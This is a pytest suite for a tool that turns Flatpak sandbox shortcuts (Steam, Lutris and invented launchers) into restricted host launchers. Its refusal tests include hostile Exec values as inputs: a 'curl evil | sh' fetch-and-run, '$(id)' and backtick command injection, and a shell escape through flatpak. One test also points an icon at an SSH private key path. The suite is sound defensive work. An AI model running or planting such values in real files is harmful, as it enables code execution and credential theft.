"""Flatpak apps' desktop and menu shortcuts reach the host, and only as safe launchers.

WHY
---
A Flatpak app has its own home (~/.var/app/<id>) and usually no ~/Desktop, so
"Create desktop shortcut" in Flathub's Steam (user report; three unseen
shortcuts on behotv since October) and in other game launchers wrote into the
sandbox and nothing appeared. Their launchers run in-sandbox commands
(`steam steam://rungameid/N`) that do not exist on the host.

COSMIC Files runs a .desktop file on the desktop without asking, so a sandbox's
file must never be passed through. The generic rule: bring a shortcut over only
if it opens exactly one link of a scheme THE SAME APP declares
(x-scheme-handler/* in its exported desktop file), and write a fresh launcher
`flatpak run <id> "<link>"`. That launcher can do what clicking the link on a web
page does, nothing more. Only Steam could be tested on real hardware, so the
other launchers here are made up: the rule must not depend on any one of them.
"""
from __future__ import annotations

import importlib.machinery
import importlib.util
import json
import os
import pathlib
import subprocess
import sys
import time

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[2]
OVERLAY = ROOT / "buildroot-external" / "board" / "desktop" / "rootfs-overlay"
SCRIPT = OVERLAY / "usr/libexec/pengyos/sandbox-shortcuts"
UNIT = OVERLAY / "usr/lib/systemd/user/pengyos-sandbox-shortcuts.service"
WANTS = OVERLAY / "etc/systemd/user/default.target.wants"

STEAM = "com.valvesoftware.Steam"
ELDEN = """[Desktop Entry]
Name=ELDEN RING
Comment=Play this game on Steam
Exec=steam steam://rungameid/1245620
Icon=steam_icon_1245620
Terminal=false
Type=Application
Categories=Game;
"""


def load():
    loader = importlib.machinery.SourceFileLoader("sandbox_shortcuts", str(SCRIPT))
    spec = importlib.util.spec_from_loader("sandbox_shortcuts", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


class Env:
    def __init__(self, home: pathlib.Path, flatpak: pathlib.Path):
        self.home, self.flatpak, self.mod = home, flatpak, load()
        self.exports = flatpak / "exports/share/applications"
        self.exports.mkdir(parents=True)

    def export(self, app_id, name, text):
        """Like Flatpak: the export is a symlink into the app's deploy dir."""
        real = self.flatpak / "app" / app_id / "current/active/export/share/applications" / name
        real.parent.mkdir(parents=True, exist_ok=True)
        real.write_text(text)
        (self.exports / name).symlink_to(
            f"../../../app/{app_id}/current/active/export/share/applications/{name}")

    def install(self, app_id, schemes=(), extra_exports=()):
        mime = "".join(f"x-scheme-handler/{s};" for s in schemes)
        self.export(app_id, f"{app_id}.desktop",
                    f"[Desktop Entry]\nName={app_id}\nExec=/usr/bin/flatpak run {app_id}\n"
                    f"Type=Application\nMimeType={mime}\n")
        for name, text in extra_exports:
            self.export(app_id, name, text)
        sandbox = self.home / ".var/app" / app_id
        sandbox.mkdir(parents=True, exist_ok=True)
        return sandbox

    def shortcut(self, app_id, text, name="ELDEN RING.desktop", where="Desktop"):
        p = self.home / ".var/app" / app_id / where / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        return p

    def desktop(self, name="ELDEN RING.desktop"):
        return self.home / "Desktop" / name


@pytest.fixture
def env(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".config").mkdir(parents=True)
    (home / ".config/user-dirs.dirs").write_text('XDG_DESKTOP_DIR="$HOME/Desktop"\n')
    for v in ("XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_STATE_HOME"):
        monkeypatch.delenv(v, raising=False)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("PENGYOS_FLATPAK_EXPORTS", str(tmp_path / "flatpak/exports/share/applications"))
    return Env(home, tmp_path / "flatpak")


# --- Steam: the case seen on real hardware -----------------------------------

def test_steam_desktop_and_menu_shortcuts_come_out_rewritten(env):
    sb = env.install(STEAM, ["steam", "steamlink"])
    env.shortcut(STEAM, ELDEN)
    env.shortcut(STEAM, ELDEN, where=".local/share/applications")
    icon = sb / ".local/share/icons/hicolor/48x48/apps/steam_icon_1245620.png"
    icon.parent.mkdir(parents=True)
    icon.write_bytes(b"\x89PNG fake")

    assert env.mod.sync() == 2
    for dest in (env.desktop(),
                 env.home / f".local/share/applications/{STEAM}.ELDEN RING.desktop"):
        text = dest.read_text()
        assert f'Exec=/usr/bin/flatpak run {STEAM} "steam://rungameid/1245620"\n' in text
        assert "Name=ELDEN RING\n" in text
        assert f"Icon={STEAM}.steam_icon_1245620\n" in text
        assert os.stat(dest).st_mode & 0o111
    copied = env.home / f".local/share/icons/hicolor/48x48/apps/{STEAM}.steam_icon_1245620.png"
    assert copied.read_bytes() == b"\x89PNG fake"
    assert env.mod.sync() == 0      # idempotent


# --- the generic rule --------------------------------------------------------

@pytest.mark.parametrize("app_id,schemes,exec_line,link", [
    ("net.lutris.Lutris", ["lutris"], "env LUTRIS_SKIP_INIT=1 lutris lutris:rungameid/12", "lutris:rungameid/12"),
    ("com.example.Launcher", ["example"], 'xdg-open "example://launch?appName=Foo&runner=bar"',
     "example://launch?appName=Foo&runner=bar"),
    ("org.example.Games", ["exgame"], "/app/bin/games --flag exgame://play/a%20b", "exgame://play/a%%20b"),
])
def test_any_app_that_opens_its_own_link_works(env, app_id, schemes, exec_line, link):
    env.install(app_id, schemes)
    env.shortcut(app_id, ELDEN.replace("Exec=steam steam://rungameid/1245620", f"Exec={exec_line}"),
                 where="data/applications")
    assert env.mod.sync() == 1
    text = (env.home / f".local/share/applications/{app_id}.ELDEN RING.desktop").read_text()
    assert f'Exec=/usr/bin/flatpak run {app_id} "{link}"\n' in text


def test_a_scheme_from_another_desktop_file_of_the_same_app_counts(env):
    env.install("org.example.Multi", [], [("org.example.Multi.Handler.desktop",
                                          "[Desktop Entry]\nMimeType=x-scheme-handler/multi;\n")])
    env.shortcut("org.example.Multi", ELDEN.replace("steam steam://rungameid/1245620", "m multi://x"))
    assert env.mod.sync() == 1


@pytest.mark.parametrize("exec_line", [
    "Exec=sh -c 'curl evil | sh'",
    "Exec=steam steam://rungameid/1245620 steam://rungameid/2",      # two links
    "Exec=lutris lutris:rungameid/1",                                # not Steam's scheme
    "Exec=xdg-open https://example.com/",                            # not declared
    "Exec=steam 'steam://run/1$(id)'",
    "Exec=steam \"steam://run/1`id`\"",
    'Exec=steam "steam://run/1 --other-flag"',                        # whitespace
    "Exec=/usr/bin/flatpak run --command=sh com.valvesoftware.Steam",
])
def test_anything_but_one_own_link_is_refused(env, exec_line):
    env.install(STEAM, ["steam"])
    env.shortcut(STEAM, ELDEN.replace("Exec=steam steam://rungameid/1245620", exec_line))
    assert env.mod.sync() == 0
    assert not env.desktop().exists()


def test_an_app_cannot_borrow_another_apps_scheme(env):
    env.install(STEAM, ["steam"])
    env.install("org.evil.App", [])
    env.shortcut("org.evil.App", ELDEN)          # a steam:// link, from an app that doesn't declare it
    assert env.mod.sync() == 0


def test_a_sandbox_without_an_installed_app_is_ignored(env):
    (env.home / ".var/app/org.gone.App/Desktop").mkdir(parents=True)
    env.shortcut("org.gone.App", ELDEN)
    assert env.mod.sync() == 0


def test_only_link_name_and_a_prefixed_icon_cross_the_boundary(env):
    env.install(STEAM, ["steam"])
    env.install("org.mozilla.firefox", [])
    sb = env.home / ".var/app" / STEAM
    icon = sb / "data/icons/hicolor/scalable/apps/org.mozilla.firefox.svg"
    icon.parent.mkdir(parents=True)
    icon.write_text("<svg/>")
    env.shortcut(STEAM, ELDEN.replace("Icon=steam_icon_1245620", "Icon=org.mozilla.firefox")
                 + "Path=/tmp\nTryExec=/bin/sh\n[Desktop Action x]\nExec=sh\n")
    env.mod.sync()
    text = env.desktop().read_text()
    assert f"Icon={STEAM}.org.mozilla.firefox\n" in text        # can't replace Firefox's icon
    assert not (env.home / ".local/share/icons/hicolor/scalable/apps/org.mozilla.firefox.svg").exists()
    assert "Path=" not in text and "TryExec" not in text and "Desktop Action" not in text
    assert text.count("Exec=") == 1


def test_an_icon_path_falls_back_to_the_app_icon(env):
    env.install(STEAM, ["steam"])
    env.shortcut(STEAM, ELDEN.replace("Icon=steam_icon_1245620", "Icon=/home/x/.ssh/id_ed25519"))
    env.mod.sync()
    assert f"Icon={STEAM}\n" in env.desktop().read_text()


def test_symlinks_in_the_sandbox_are_not_followed(env, tmp_path):
    sb = env.install(STEAM, ["steam"])
    real = tmp_path / "elsewhere.desktop"
    real.write_text(ELDEN)
    (sb / "Desktop").mkdir()
    (sb / "Desktop/link.desktop").symlink_to(real)
    icon = sb / ".local/share/icons/hicolor/48x48/apps/steam_icon_1245620.png"
    icon.parent.mkdir(parents=True)
    secret = tmp_path / "secret"
    secret.write_text("key")
    icon.symlink_to(secret)
    env.shortcut(STEAM, ELDEN)
    env.mod.sync()
    assert not env.desktop("link.desktop").exists()
    assert not list((env.home / ".local/share").glob("icons/**/*steam_icon*"))


def test_a_user_file_with_the_same_name_is_left_alone(env):
    env.install(STEAM, ["steam"])
    env.desktop().parent.mkdir(parents=True)
    env.desktop().write_text("[Desktop Entry]\nName=mine\nExec=true\n")
    env.shortcut(STEAM, ELDEN)
    env.mod.sync()
    assert env.desktop().read_text() == "[Desktop Entry]\nName=mine\nExec=true\n"


def test_two_apps_with_the_same_shortcut_name_do_not_overwrite_each_other(env):
    env.install(STEAM, ["steam"])
    env.install("net.lutris.Lutris", ["lutris"])
    env.shortcut(STEAM, ELDEN)
    env.shortcut("net.lutris.Lutris", ELDEN.replace("steam steam://rungameid/1245620", "lutris lutris:rungameid/9"))
    env.mod.sync()
    assert "steam://rungameid/1245620" in env.desktop().read_text()


def test_a_deleted_copy_stays_deleted_until_the_app_rewrites_it(env):
    env.install(STEAM, ["steam"])
    src = env.shortcut(STEAM, ELDEN)
    env.mod.sync()
    env.desktop().unlink()
    assert env.mod.sync() == 0 and not env.desktop().exists()
    src.write_text(ELDEN + "\n")
    assert env.mod.sync() == 1 and env.desktop().exists()


def test_uninstall_removes_the_copy_unless_the_user_edited_it(env):
    env.install(STEAM, ["steam"])
    a = env.shortcut(STEAM, ELDEN)
    b = env.shortcut(STEAM, ELDEN.replace("ELDEN RING", "Crab").replace("1245620", "2753970"), "Crab.desktop")
    env.mod.sync()
    crab = env.desktop("Crab.desktop")
    crab.write_text(crab.read_text() + "# mine\n")
    a.unlink()
    b.unlink()
    env.mod.sync()
    assert not env.desktop().exists()
    assert crab.exists()
    state = json.loads((env.home / ".local/state/pengyos/sandbox-shortcuts.json").read_text())
    assert state == {}


def test_removing_the_app_removes_its_launchers(env):
    env.install(STEAM, ["steam"])
    env.shortcut(STEAM, ELDEN)
    env.mod.sync()
    (env.exports / f"{STEAM}.desktop").unlink()
    env.mod.sync()
    assert not env.desktop().exists()


def test_an_export_symlink_leaving_the_installation_is_not_read(env, tmp_path):
    outside = tmp_path / "outside.desktop"
    outside.write_text("[Desktop Entry]\nMimeType=x-scheme-handler/steam;\n")
    (env.exports / f"{STEAM}.desktop").symlink_to(outside)
    (env.home / ".var/app" / STEAM).mkdir(parents=True)
    env.shortcut(STEAM, ELDEN)
    assert env.mod.sync() == 0


def test_no_flatpak_apps_is_a_quiet_no_op(env):
    assert env.mod.sync() == 0
    assert not env.desktop().parent.exists()


def test_watch_mode_picks_up_a_shortcut_made_later(env):
    env.install(STEAM, ["steam"])
    proc = subprocess.Popen([sys.executable, "-I", str(SCRIPT), "--watch"], env=dict(os.environ),
                            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    try:
        time.sleep(0.5)
        env.shortcut(STEAM, ELDEN)                 # Desktop/ did not exist when watching began
        deadline = time.time() + 10
        while time.time() < deadline and not env.desktop().exists():
            time.sleep(0.1)
        assert env.desktop().exists(), proc.stderr.read1(4096) if proc.poll() is not None else ""
    finally:
        proc.terminate()
        proc.wait(5)


def test_unit_is_wired_and_enabled():
    unit = UNIT.read_text()
    assert "ExecStart=/usr/libexec/pengyos/sandbox-shortcuts --watch\n" in unit
    assert "WantedBy=default.target\n" in unit
    link = WANTS / UNIT.name
    assert link.is_symlink() and os.readlink(link) == f"/usr/lib/systemd/user/{UNIT.name}"
    assert not list(WANTS.glob("pengyos-steam-shortcuts*"))
    assert os.access(SCRIPT, os.X_OK)
    assert SCRIPT.read_text().startswith("#!/usr/bin/python3 -I\n")
